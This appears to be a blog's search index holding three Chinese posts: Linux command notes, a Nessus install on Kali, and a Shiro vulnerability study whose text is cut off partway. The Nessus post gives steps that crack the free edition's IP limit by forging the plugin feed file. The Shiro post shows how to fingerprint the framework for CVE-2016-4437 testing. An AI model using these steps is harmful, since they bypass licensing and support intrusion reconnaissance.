<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>Linux随记</title>
      <link href="/post/4/"/>
      <url>/post/4/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>此为 Linux 的小笔记</p><h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><h3 id="Linux-系统文件结构"><a href="#Linux-系统文件结构" class="headerlink" title="Linux 系统文件结构"></a>Linux 系统文件结构</h3><p>Linux 系统不像 Windows 系统那样拥有<strong>注册表</strong>对系统进行统一的管理，而是由一个庞大树状结构的文件目录所组成，分散管理，以”/“开始，称为根目录。可以说 在 Linux 中都是文件。<br>那么，该系统文件结构具体是什么样的呢？<br><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo@master/2022/%E7%9B%AE%E5%BD%95%E7%BB%93%E6%9E%84.png">  </p><p><strong>注意：</strong>Linux 中的目录结构并不像 Windows 中的那样具有包含关系，Linux 中的目录只是一个引索点而已，不存在包含关系。</p><table><thead><tr><th align="center">1级目录</th><th align="left">存放的数据</th></tr></thead><tbody><tr><td align="center">/bin/</td><td align="left">存放普通用户和 root 都可以执行的系统命令</td></tr><tr><td align="center">/boot/</td><td align="left">系统启动引导目录，存放跟系统启动相关的文件</td></tr><tr><td align="center">/dev/</td><td align="left">设备文件保存目录</td></tr><tr><td align="center">/etc/</td><td align="left">配置文件保存目录</td></tr><tr><td align="center">/home/</td><td align="left">普通用户家目录</td></tr><tr><td align="center">/lib/</td><td align="left">库文件保存目录，一些应用的零件</td></tr><tr><td align="center">/media/</td><td align="left">挂载目录。可以用来挂载媒体设备，如软盘和光盘</td></tr><tr><td align="center">/mnt/</td><td align="left">挂载目录。如 U 盘、移动硬盘和其他操作系统的分区</td></tr><tr><td align="center">/misc/</td><td align="left">挂载目录。可以用来挂载 NFS 服务的共享目录。虽然系统准备了三个默认挂载目录  /media/、/mnt/、/misc/，但是到底在哪个目录中挂载什么设备可以由自己决定</td></tr><tr><td align="center">/opt/</td><td align="left">第三方安装的软件保存位置。这个目录是放置和安装其他软件的位置，手工安装的源码包软件都可以安装到这个目录中。</td></tr><tr><td align="center">/root/</td><td align="left">root 的主目录。普通用户主目录在 /home/ 下，root 主目录直接在“/”下</td></tr><tr><td align="center">/sbin/</td><td align="left">root 能使用的系统命令</td></tr><tr><td align="center">/srv/</td><td align="left">服务数据保存目录。一些系统服务启动之后，可以在这个目录中保存所需要的数据</td></tr><tr><td align="center">/tmp/</td><td align="left">临时文件目录。系统存放临时文件的目录，在该目录下，所有用户都可以访问和写入。解压缩，机器之间拷贝文件都要用到该目录</td></tr><tr><td align="center">/usr/</td><td align="left">第三方安装的东西可以放在这里，如自己装的软件等等，首先选此目录，其次选择 /opt/ 目录，目录下还可以在细分其他目录</td></tr><tr><td align="center">/svr/</td><td align="left">一些服务</td></tr></tbody></table><p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo@master/2022/%E7%9B%AE%E5%BD%95%E7%BB%93%E6%9E%84%E8%A7%A3%E9%87%8A.png"></p><h3 id="文件目录命名规则"><a href="#文件目录命名规则" class="headerlink" title="文件目录命名规则"></a>文件目录命名规则</h3><p>首先 Linux 是区分大小写的，比如 aaa 文件或目录与 AAA 文件或目录是两个不同的文件或目录。<br>另外，Linux 对文件扩展名(后缀)是不区分的，也就是说，一张 a.jpg 的图片在 Linux 中即使不加 .jpg 也能正常显示，文件内容该是什么打开后就是什么。</p><h3 id="shell"><a href="#shell" class="headerlink" title="shell"></a>shell</h3><p>Shell是系统的用户界面，显示为一个命令行，它提供了用户与内核进行交互操作的一种接口。它接收用户输入的命令并把它送入内核去执行<br><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo@master/2022/shell.png"></p><h3 id="Linux-简单命令"><a href="#Linux-简单命令" class="headerlink" title="Linux 简单命令"></a>Linux 简单命令</h3><p>在 Linux 下我们会使用到很多的命令，有内部命令和外部命令的区别。内部命令是随 shell 一起加载好的，可以直接用，外部命令需要找到命令所在位置才可以使用，或者添加到环境变变量中去。</p><h4 id="Linux-环境变量"><a href="#Linux-环境变量" class="headerlink" title="Linux 环境变量"></a>Linux 环境变量</h4><p>环境变量是指在操作系统中用来指定操作系统运行的一些参数：也就是说，操作系统通过环境变量来找到运行时的一些资源。在 Windows 中大家很熟悉。Linux 使用 env 命令来查看到 Linux 系统中所有的环境变量。<br><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo@master/2022/%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F.png"></p><p>我们先来认识一下 Linux 命令的基本格式：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Linux命令= 命令 -【选项】 【参数】</span><br></pre></td></tr></table></figure><p>并不是所有的都需要以上三个部分，后两部分不是必须。<br>【选项】是命令的一些操作的指令，实现命令的某些功能。- 后一般接单个字母，– 后一般接单词<br>【参数】通常是被命令操作的对象，例如文件，目录等</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">xxx --<span class="built_in">help</span>  给一些小tips</span><br><span class="line">man xxx 完整的使用手册（没有分类整理）</span><br><span class="line">info  xxx 完整的使用手册（有分类整理）</span><br></pre></td></tr></table></figure><h4 id="系统服务控制命令"><a href="#系统服务控制命令" class="headerlink" title="系统服务控制命令"></a>系统服务控制命令</h4><p>针对服务的控制的命令，常用的就是 systemctl ，语法：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systemctl [控制命令] [服务名称]</span><br></pre></td></tr></table></figure><blockquote><p>[控制命令] 有：<br>start 启动<br>stop 停止<br>restart 重启 (先关闭，再启动)<br>reload 重新加载 (不关闭当前服务的重启)<br>status 查看服务状态 (运行中还是关闭状态)</p></blockquote><h4 id="cd-命令"><a href="#cd-命令" class="headerlink" title="cd 命令"></a>cd 命令</h4><p>它是用来切换工作目录的，根据后面所接的符号，路径等进行跳转</p><table><thead><tr><th align="center">符号</th><th align="center">意义</th></tr></thead><tbody><tr><td align="center">~</td><td align="center">家目录</td></tr><tr><td align="center">..</td><td align="center">上一级目录</td></tr><tr><td align="center">.</td><td align="center">当前目录</td></tr><tr><td align="center">-</td><td align="center">上次的目录</td></tr></tbody></table><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">[mtrleed@localhost /]$ <span class="built_in">cd</span> opt</span><br><span class="line">[mtrleed@localhost opt]$ <span class="built_in">cd</span> ..</span><br><span class="line">[mtrleed@localhost /]$ <span class="built_in">cd</span> -</span><br><span class="line">/opt</span><br><span class="line">[mtrleed@localhost opt]$ <span class="built_in">cd</span> ../</span><br><span class="line">[mtrleed@localhost /]$ <span class="built_in">cd</span> ~</span><br><span class="line">[mtrleed@localhost ~]$ <span class="built_in">pwd</span></span><br><span class="line">/home/mtrleed</span><br><span class="line">[mtrleed@localhost ~]$ </span><br></pre></td></tr></table></figure><h4 id="ls-命令"><a href="#ls-命令" class="headerlink" title="ls 命令"></a>ls 命令</h4><p>此命令全名为 list ，用来罗列出文件等信息，它同样有着很多的【选项】</p><table><thead><tr><th>选项</th><th>功能</th></tr></thead><tbody><tr><td>-a</td><td>显示全部的文件，包括隐藏文件（隐藏文件通常为 . 开头）</td></tr><tr><td>-d</td><td>仅列出目录本身，而不是列出目录内的文件数据</td></tr><tr><td>-F</td><td>在文件或目录名后加上文件类型的指示符号，例如，* 代表可运行文件，/ 代表目录，= 代表 <a href="http://c.biancheng.net/socket/">socket</a> 文件，| 代表 FIFO 文件</td></tr><tr><td>-h</td><td>以人们易读的方式显示文件或目录大小，如 1KB、234MB、2GB 等</td></tr><tr><td>-i</td><td>显示 inode 节点信息，与磁盘有关</td></tr><tr><td>-l</td><td>使用长格式列出文件和目录信息，就是详细信息</td></tr><tr><td>-R</td><td>连同子目录内容一起列出来，将该目录下的所有文件都显示出来</td></tr><tr><td>-S</td><td>以文件容量大小排序</td></tr><tr><td>-t</td><td>以时间排序</td></tr></tbody></table><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">[mtrleed@localhost /]$ ls  </span><br><span class="line">bin   dev  home  lib64  mnt  proc  run   srv  tmp  var</span><br><span class="line">boot  etc  lib   media  opt  root  sbin  sys  usr</span><br><span class="line">[mtrleed@localhost /]$ ls -a</span><br><span class="line">.   bin   dev  home  lib64  mnt  proc  run   srv  tmp  var</span><br><span class="line">..  boot  etc  lib   media  opt  root  sbin  sys  usr</span><br><span class="line">[mtrleed@localhost /]$ ls -l</span><br><span class="line">总用量 28</span><br><span class="line">lrwxrwxrwx.   1 root root    7 1月   3 01:42 bin -&gt; usr/bin</span><br><span class="line">dr-xr-xr-x.   5 root root 4096 1月   3 01:48 boot</span><br><span class="line">drwxr-xr-x.  20 root root 3320 1月   3 23:17 dev</span><br><span class="line">drwxr-xr-x. 148 root root 8192 1月   3 01:50 etc</span><br><span class="line">drwxr-xr-x.   3 root root   21 1月   3 01:47 home</span><br><span class="line">lrwxrwxrwx.   1 root root    7 1月   3 01:42 lib -&gt; usr/lib</span><br><span class="line">lrwxrwxrwx.   1 root root    9 1月   3 01:42 lib64 -&gt; usr/lib64</span><br><span class="line">drwxr-xr-x.   2 root root    6 4月  11 2018 media</span><br><span class="line">drwxr-xr-x.   2 root root    6 4月  11 2018 mnt</span><br><span class="line">drwxr-xr-x.   3 root root   16 1月   3 01:45 opt</span><br><span class="line">dr-xr-xr-x. 251 root root    0 1月   3 23:17 proc</span><br><span class="line">dr-xr-x---.  15 root root 4096 1月   3 23:18 root</span><br><span class="line">drwxr-xr-x.  45 root root 1300 1月   3 23:19 run</span><br><span class="line">lrwxrwxrwx.   1 root root    8 1月   3 01:42 sbin -&gt; usr/sbin</span><br><span class="line">drwxr-xr-x.   2 root root    6 4月  11 2018 srv</span><br><span class="line">dr-xr-xr-x.  13 root root    0 1月   3 23:17 sys</span><br><span class="line">drwxrwxrwt.  29 root root 4096 1月   3 23:19 tmp</span><br><span class="line">drwxr-xr-x.  13 root root  155 1月   3 01:42 usr</span><br><span class="line">drwxr-xr-x.  21 root root 4096 1月   3 01:50 var</span><br><span class="line">[mtrleed@localhost /]$ ls -lh</span><br><span class="line">总用量 28K</span><br><span class="line">lrwxrwxrwx.   1 root root    7 1月   3 01:42 bin -&gt; usr/bin</span><br><span class="line">dr-xr-xr-x.   5 root root 4.0K 1月   3 01:48 boot</span><br><span class="line">drwxr-xr-x.  20 root root 3.3K 1月   3 23:17 dev</span><br><span class="line">drwxr-xr-x. 148 root root 8.0K 1月   3 01:50 etc</span><br><span class="line">drwxr-xr-x.   3 root root   21 1月   3 01:47 home</span><br><span class="line">lrwxrwxrwx.   1 root root    7 1月   3 01:42 lib -&gt; usr/lib</span><br><span class="line">lrwxrwxrwx.   1 root root    9 1月   3 01:42 lib64 -&gt; usr/lib64</span><br><span class="line">drwxr-xr-x.   2 root root    6 4月  11 2018 media</span><br><span class="line">drwxr-xr-x.   2 root root    6 4月  11 2018 mnt</span><br><span class="line">drwxr-xr-x.   3 root root   16 1月   3 01:45 opt</span><br><span class="line">dr-xr-xr-x. 251 root root    0 1月   3 23:17 proc</span><br><span class="line">dr-xr-x---.  15 root root 4.0K 1月   3 23:18 root</span><br><span class="line">drwxr-xr-x.  45 root root 1.3K 1月   3 23:19 run</span><br><span class="line">lrwxrwxrwx.   1 root root    8 1月   3 01:42 sbin -&gt; usr/sbin</span><br><span class="line">drwxr-xr-x.   2 root root    6 4月  11 2018 srv</span><br><span class="line">dr-xr-xr-x.  13 root root    0 1月   3 23:17 sys</span><br><span class="line">drwxrwxrwt.  29 root root 4.0K 1月   3 23:19 tmp</span><br><span class="line">drwxr-xr-x.  13 root root  155 1月   3 01:42 usr</span><br><span class="line">drwxr-xr-x.  21 root root 4.0K 1月   3 01:50 var</span><br></pre></td></tr></table></figure><p>注意，只有文件的大小是能确定的，目录的大小是引索的大小，而不是目录下的数据的大小</p><h4 id="pwd-命令"><a href="#pwd-命令" class="headerlink" title="pwd 命令"></a>pwd 命令</h4><p>此命令用来显示当前的工作目录</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[mtrleed@localhost /]$ <span class="built_in">cd</span> opt</span><br><span class="line">[mtrleed@localhost opt]$ <span class="built_in">pwd</span></span><br><span class="line">/opt</span><br></pre></td></tr></table></figure><h4 id="mkdir-命令"><a href="#mkdir-命令" class="headerlink" title="mkdir 命令"></a>mkdir 命令</h4><p>该命令用来创建目录，通常目录跟随着访问权限，我们要用到 -m ，在需要创建自定义多级目录的情况下需要用到 -p ，否则是无法创建的</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost opt]<span class="comment"># mkdir test</span></span><br><span class="line">[root@localhost opt]<span class="comment"># ls</span></span><br><span class="line">rh  <span class="built_in">test</span></span><br><span class="line">[root@localhost opt]<span class="comment"># mkdir zhangsan/test1</span></span><br><span class="line">mkdir: 无法创建目录<span class="string">&quot;zhangsan/test1&quot;</span>: 没有那个文件或目录</span><br><span class="line">[root@localhost opt]<span class="comment"># mkdir -p zhangsan/test1</span></span><br><span class="line">[root@localhost opt]<span class="comment"># ls</span></span><br><span class="line">rh  <span class="built_in">test</span>  zhangsan</span><br></pre></td></tr></table></figure><h4 id="touch-命令"><a href="#touch-命令" class="headerlink" title="touch 命令"></a>touch 命令</h4><p>该命令用于创建文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost opt]<span class="comment"># cd test</span></span><br><span class="line">[root@localhost <span class="built_in">test</span>]<span class="comment"># touch TTT</span></span><br><span class="line">[root@localhost <span class="built_in">test</span>]<span class="comment"># ls</span></span><br><span class="line">TTT</span><br></pre></td></tr></table></figure><h4 id="rm-命令"><a href="#rm-命令" class="headerlink" title="rm 命令"></a>rm 命令</h4><p>该命令用于删除目录或文件，具有破坏性，谨慎</p><table><thead><tr><th align="center">选项</th><th align="center">功能</th></tr></thead><tbody><tr><td align="center">-f</td><td align="center">强制删除，递归删除时按需用，否则需多次 y (慎用)</td></tr><tr><td align="center">-i</td><td align="center">提示是否确定删除</td></tr><tr><td align="center">-r</td><td align="center">递归删除，删除目录时要用到</td></tr></tbody></table><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost opt]<span class="comment"># rm -r test</span></span><br><span class="line">rm：是否进入目录<span class="string">&quot;test&quot;</span>? y</span><br><span class="line">rm：是否删除普通空文件 <span class="string">&quot;test/TTT&quot;</span>？y</span><br><span class="line">rm：是否删除目录 <span class="string">&quot;test&quot;</span>？y</span><br><span class="line">[root@localhost opt]<span class="comment"># ls</span></span><br><span class="line">rh  zhangsan</span><br></pre></td></tr></table></figure><h4 id="cp-命令"><a href="#cp-命令" class="headerlink" title="cp 命令"></a>cp 命令</h4><p>该命令用于复制文件或目录</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cp [选项] [源文件] [目标文件]</span><br></pre></td></tr></table></figure><table><thead><tr><th align="center">选项</th><th align="center">功能</th></tr></thead><tbody><tr><td align="center">-i</td><td align="center">询问，若存在询问是否覆盖</td></tr><tr><td align="center">-p</td><td align="center">保留源文件的属性，包括所有者、所属组和时间</td></tr><tr><td align="center">-r</td><td align="center">递归复制，用于复制目录</td></tr></tbody></table><h4 id="mv-命令"><a href="#mv-命令" class="headerlink" title="mv 命令"></a>mv 命令</h4><p>该命令用于移动文件或目录，具有破坏性，谨慎</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mv [选项] [源文件] [目标文件]</span><br></pre></td></tr></table></figure><table><thead><tr><th align="center">选项</th><th align="center">功能</th></tr></thead><tbody><tr><td align="center">-f</td><td align="center">强制移动覆盖</td></tr><tr><td align="center">-i</td><td align="center">询问，如果目标文件已经存在，则询问用户是否覆盖（默认选项）</td></tr></tbody></table><p>如果源文件和目标文件在同一目录中，就会改名为 [目标文件]</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost ~]<span class="comment"># mv test test1  //test 文件改名为 test1</span></span><br></pre></td></tr></table></figure><h4 id="su-命令"><a href="#su-命令" class="headerlink" title="su 命令"></a>su 命令</h4><p>该命令用于临时切换用户</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost /]<span class="comment"># whoami</span></span><br><span class="line">root</span><br><span class="line">[root@localhost /]<span class="comment"># su mtrleed</span></span><br><span class="line">[mtrleed@localhost /]$ whoami</span><br><span class="line">mtrleed</span><br></pre></td></tr></table></figure><h4 id="sudo-命令"><a href="#sudo-命令" class="headerlink" title="sudo 命令"></a>sudo 命令</h4><p>该命令用于临时使用 root 权限来执行某些命令，在需要执行的命令前添加即可</p>]]></content>
      
      
      <categories>
          
          <category> 操作系统 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux系统 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>kali部署nessus</title>
      <link href="/post/3/"/>
      <url>/post/3/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>最近有需要在机器用到漏扫，发现nessus还不错，索性在虚拟机上安装了。安装过程有些要注意的地方，诶我又索性做个笔记。话不多说开干 🛠</p><h2 id="部署"><a href="#部署" class="headerlink" title="部署"></a>部署</h2><h3 id="下载安装包"><a href="#下载安装包" class="headerlink" title="下载安装包"></a>下载安装包</h3><p>因为是国外服务器所以建议科学上网。到官网寻找适合自己系统版本的nessus发行版，地址在这 <a href="https://www.tenable.com/downloads/nessus%E3%80%82%E8%BF%99%E6%98%AF%E6%88%91%E9%80%89%E6%8B%A9%E7%9A%84%E7%89%88%E6%9C%AC">https://www.tenable.com/downloads/nessus。这是我选择的版本</a><br><img src="https://gcore.jsdelivr.net/gh/MTRleed/PicGo@master/file/nessus1.png"></p><h3 id="安装过程"><a href="#安装过程" class="headerlink" title="安装过程"></a>安装过程</h3><p>将下载好的安装包放到自己想放的地方，我选择 opt 目录。在此目录下启动终端，执行命令安装该软件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dpkg -i Nessus-10.4.1-debian9_amd64.deb</span><br></pre></td></tr></table></figure><p><img src="https://gcore.jsdelivr.net/gh/MTRleed/PicGo@master/file/nessus2.png">    </p><p>​       </p><p>安装好后启动nessus试试，使用命令 </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">start nessusd.service 或 service nessusd start</span><br></pre></td></tr></table></figure><p>​       </p><p>随后访问，nessus走 SSL 协议所以 https ,默认端口8834，浏览器会提示有安全风险，点击“高级”，再点击“接受风险并继续” 直接无视。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://localhost:8834/</span><br></pre></td></tr></table></figure><p>选择所示版本<br><img src="https://gcore.jsdelivr.net/gh/MTRleed/PicGo@master/file/nessus3.png"></p><p>​        </p><p>这里选择 .sc<br><img src="https://gcore.jsdelivr.net/gh/MTRleed/PicGo@master/file/nessus4.png"></p><p>​        </p><p>创建账号密码（随意)<br><img src="https://gcore.jsdelivr.net/gh/MTRleed/PicGo@master/file/nessus5.png"></p><p>​        </p><p>之后等待一会进入界面<br><img src="https://gcore.jsdelivr.net/gh/MTRleed/PicGo@master/file/nessus6.png"></p><p>现在还不能使用，下面进行 PJ</p><p>​        </p><p>我们需要用到 nessus 的一个叫挑战码的东西，执行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/opt/nessus/sbin/nessuscli fetch --challenge </span><br></pre></td></tr></table></figure><p>就是这个<br><img src="https://gcore.jsdelivr.net/gh/MTRleed/PicGo@master/file/nessus7.png"></p><p>​        </p><p>下一步到官网填邮箱拿激活码，地址在这 <a href="https://www.tenable.com/products/nessus/nessus-essentials">https://www.tenable.com/products/nessus/nessus-essentials</a><br><img src="https://gcore.jsdelivr.net/gh/MTRleed/PicGo@master/file/nessus8.png"></p><p>​        </p><p>随后访问网站 <a href="https://plugins.nessus.org/v2/offline.php">https://plugins.nessus.org/v2/offline.php</a><br>在其中输入刚才获得的挑战码和激活码，点击 subimt，获取 license 和 插件包<br><img src="https://gcore.jsdelivr.net/gh/MTRleed/PicGo@master/file/nessus9.png"></p><p>我们要进行离线注册，先停止 nessus 服务</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">stop nessusd.service 或 service nessusd stop</span><br></pre></td></tr></table></figure><p>​         </p><p>然后开始注册</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/opt/nessus/sbin/nessuscli fetch --register-offline /许可文件nessus.license路径/nessus.license</span><br></pre></td></tr></table></figure><p>​       </p><p>离线加载我们的插件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/opt/nessus/sbin/nessuscli update /插件包all-2.0.tar.gz文件路径/all-2.0.tar.gz</span><br></pre></td></tr></table></figure><p>​        </p><p>查看插件的信息</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /opt/nessus/lib/nessus/plugins/plugin_feed_info.inc</span><br></pre></td></tr></table></figure><p>PLUGIN_SET 的数字后面要用到</p><p>​        </p><p>修改配置文件的内容</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vi /opt/nessus/lib/nessus/plugins/plugin_feed_info.inc</span><br></pre></td></tr></table></figure><p>修改里面的内容为</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">PLUGIN_SET = &quot;XXXXXX&quot;; </span><br><span class="line">PLUGIN_FEED = &quot;ProfessionalFeed (Direct)&quot;; </span><br><span class="line">PLUGIN_FEED_TRANSPORT = &quot;Tenable Network Security Lightning&quot;;</span><br><span class="line"></span><br><span class="line">PLUGIN_SET = &quot;XXXXXX&quot;;填上刚刚查询到的信息</span><br></pre></td></tr></table></figure><p><img src="https://gcore.jsdelivr.net/gh/MTRleed/PicGo@master/file/nessus10.png">    </p><p>​        </p><p>再编辑另一个配置文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vi /opt/nessus/var/nessus/plugin_feed_info.inc </span><br></pre></td></tr></table></figure><p>内容和上述文件内容一致</p><p>​        </p><p>将这份文件拷贝到同目录的 plugins 目录下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd /opt/nessus/var/nessus/   </span><br><span class="line">cp plugin_feed_info.inc plugins</span><br></pre></td></tr></table></figure><p>经过测试，虚拟机重启后，Nessus服务每次重启后，都会重置 plugin_feed_info.inc，这将会使 nessus/plugins 目录下所有的插件都被删除，无法扫描。因此我们将此文件设为只读文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chattr +i /opt/nessus/var/nessus/plugin_feed_info.inc</span><br></pre></td></tr></table></figure><p>​         </p><p>重新启动 nessus 服务</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">start nessusd.service 或 service nessusd start</span><br></pre></td></tr></table></figure><p>​         </p><p>访问</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">htps://localhost:8834/</span><br></pre></td></tr></table></figure><p>会再次出现初始化的页面，这是Nessus在编译和安装插件，这个过程耗时少则几分钟多则两三天，耗子尾汁吧</p><p>​        </p><p>这样就可以使用了，不再限制16个 ip<br><img src="https://gcore.jsdelivr.net/gh/MTRleed/PicGo@master/file/nessus11.png"></p><p>​        </p><p>​                                                                 <strong>好了，最后提醒要做守法好公民哦 ！</strong></p>]]></content>
      
      
      <categories>
          
          <category> 随笔 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> nessus </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>shiro漏洞学习</title>
      <link href="/post/5/"/>
      <url>/post/5/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>shiro框架是Apache提供的一个安全框架（Java常用），该框架可以被很多的语言使用，广泛运用在各种应用系统中（大多为单体项目认证授权，微服务架构项目使用分布式部署可能不太适合）。shiro具有认证、授权、加密和会话管理等功能。</p><h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><p>shiro的四个主要功能简介<br><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo@master/2022/shiro%E5%9B%9B%E4%B8%AA%E5%8A%9F%E8%83%BD.png"></p><ol><li><p>Anthentication认证，验证用户是否有相应的身份-登录认证;</p></li><li><p>Authorization授权，即权限验证;对已经通过认证的用户检查是否具有某个权限或者角色，从而控制是否能够进行某种操作;</p></li><li><p>SessionManagment会话管理，用户在认证成功之后创建会话，在没有退出之前，当前用户的所有信息都会保存在这个会话中;可以是普通的JavaSE应用，也可以是web应用;</p></li><li><p>Cryptography加密，对敏感信息进行加密处理,shiro就提供这种加密机制;</p></li></ol><p>支持的特性:</p><ul><li>oiebSupport-Shiro提供了过滤器，可以通过过滤器拦截web请求来处理web应用的访问控制</li><li>Caching缓存支持,shiro可以缓存用户信息以及用户的角色权限信息，可以提高执行效率</li><li>Concurrencyshiro支持多线程应用</li><li>Testing提供测试支持</li><li>RunAs允许一个用户以另一种身份去访问</li><li>RemeberMe（漏洞点之一）<br>说明:Shiro是一个安全框架，不提供用户、权限的维护（用户的权限管理需要我们自己去设计)</li></ul><h3 id="Shiro框架指纹识别"><a href="#Shiro框架指纹识别" class="headerlink" title="Shiro框架指纹识别"></a>Shiro框架指纹识别</h3><p>在请求包的Cookie中为rememberMe字段赋任意值，收到返回包的Set-Cookie中存在rememberMe=deleteMe字段，说明目标有可能使用Shiro框架，可以进一步测试。</p><p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo@master/2022/shiro%E6%8C%87%E7%BA%B9.png">    </p><p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo@master/2022/shiro%E6%8C%87%E7%BA%B91.png"></p><h3 id="CVE-2016-4437-ApacheShiro1-2-4反序列化漏洞"><a href="#CVE-2016-4437-ApacheShiro1-2-4反序列化漏洞" class="headerlink" title="(CVE-2016-4437)ApacheShiro1.2.4反序列化漏洞"></a>(CVE-2016-4437)ApacheShiro1.2.4反序列化漏洞</h3><p><strong>漏洞原理</strong></p><p>因为RemeberMe功能的存在下次访问时无需再登录就可访问，默认使用CookieRememberMeManager，登录时勾选rememberme序列化保存登录信息到cookie</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Cookie过程:</span><br><span class="line">序列化=&gt;AES加密=&gt;base64编码=&gt;写入Cookie</span><br><span 